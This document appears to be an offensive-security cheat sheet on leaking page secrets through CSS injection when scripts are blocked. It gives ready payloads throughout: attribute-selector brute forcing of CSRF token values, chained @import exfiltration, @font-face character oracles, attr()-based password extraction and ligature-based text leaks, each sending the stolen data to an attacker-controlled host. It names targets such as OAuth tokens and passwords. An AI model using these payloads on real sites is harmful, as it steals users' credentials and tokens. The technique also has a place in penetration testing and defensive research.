# CSS-injection data exfiltration — Open WHEN: you can inject CSS (a `<style>` block, a `style=` attribute, or a controllable external stylesheet) but cannot run JavaScript (CSP blocks scripts, the sink is style-only, or markup is sanitized but CSS survives). CSS-only leaks secrets character-by-character via attribute selectors, `@import`, `@font-face` and `attr()`

CSS injection is a client-side leak that needs NO JavaScript. CSS is often
permitted where JS is blocked (CSP frequently allows inline styles). The page
exfiltrates a secret on the page (CSRF token, input value, text node) by making
the browser fetch a user-controlled URL only when a CSS rule matches.

## Attribute-selector brute force (steal an input `value` char by char)
A matching selector loads a background image from a host you control, leaking
the matched prefix. Guess char 1, then char 2, and so on (each round usually
needs the page to reload — via an iframe).
```css
input[name="csrf"][value^="a"]{background:url(https://SRV/?c=a)}
input[name="csrf"][value^="b"]{background:url(https://SRV/?c=b)}
/* ...one rule per candidate char; the one that fetches reveals the prefix */
```
Selector operators: `^=` prefix, `$=` suffix, `*=` substring.
- **Hidden inputs can't carry a background** — style a *sibling* instead:
  ```css
  input[name="csrf"][value^="a"] + input{background:url(https://SRV/?c=a)}
  ```
- **`:has()`** styles a parent from its child:
  ```css
  div:has(input[value="1337"]){background:url(/leak?v=1337)}
  ```
- **Speed it up**: run prefix on one property and suffix on another in the same
  round — `background` for `^=`, `border-image`/`list-style-image` for `$=`.

## Blind CSS exfiltration via `@import` (+ Sequential Import Chaining)
When you don't know the page layout, import a staging stylesheet that the
server controls; it streams back new rules without a page reload.
```html
<style>@import url(https://SRV/staging?len=32)</style>
<style>@import'//SRV'</style>
```
Sequential Import Chaining (SIC): the staging response long-polls, and each time
a `background-image` rule fires (a char matched) the server emits the next
`@import` to continue — full extraction, no reloads. Tools: `blind-css-exfiltration`,
`d0nutptr/sic`.

## `@font-face unicode-range` oracle (does char X exist on the page?)
Map one custom font per character; the browser only fetches a font whose
`unicode-range` is actually rendered, so the request reveals which chars are
present.
```html
<style>
@font-face{font-family:o;src:url(https://SRV/?A);unicode-range:U+0041}
@font-face{font-family:o;src:url(https://SRV/?B);unicode-range:U+0042}
#secret{font-family:o}
</style>
```
Limits: fires once per distinct char (can't count repeats), gives no order.
Still a reliable presence oracle. Chrome marked it WontFix.

## `attr()` + `image-set()` value extraction (cross-origin stylesheet)
A cross-origin stylesheet you host can read an attribute value into a URL; the
relative URL resolves against the *stylesheet's* origin, so the value lands on
your server in one shot (no brute force).
```css
input[name="password"]{background:image-set(attr(value))}
```
Request observed on your host: `GET /supersecret`. Requires the page to load
your stylesheet and the browser to support advanced `attr()`.

## Inline-style `if()` conditional exfil (single style attribute)
Newer CSS `if()` + custom properties let one `style=` attribute branch on a
value and pick a URL — useful when you can only inject into a `style=`.
```html
<div style='--v:attr(data-uid);--s:if(style(--v:"1"):url(/1);else:url(/0));background:image-set(var(--s))' data-uid='1'></div>
```

## Text-node leaking (scrollbars / ligatures)
Plain text (not in an attribute) can still leak: a custom font with wide
ligatures changes element width when a target substring renders; detect the
width change with a scrollbar or media query and binary-search the content.
Tools: `fontleak`, `css-scrollbar-attack`.
```html
<style>@import url("http://SRV/?selector=.secret&parent=head&alphabet=abcdef0123456789")</style>
```

## When to reach for this
- CSP allows `style-src` but blocks `script-src`.
- Sanitizer strips tags/handlers but keeps `<style>` or `style=`.
- Target is a CSRF token, a hidden-input value, an OAuth token in the DOM, or
  any secret text rendered on the page.
Confirm a hit by watching your collector for the leaked character/value, the
same way you confirm a blind XSS callback.
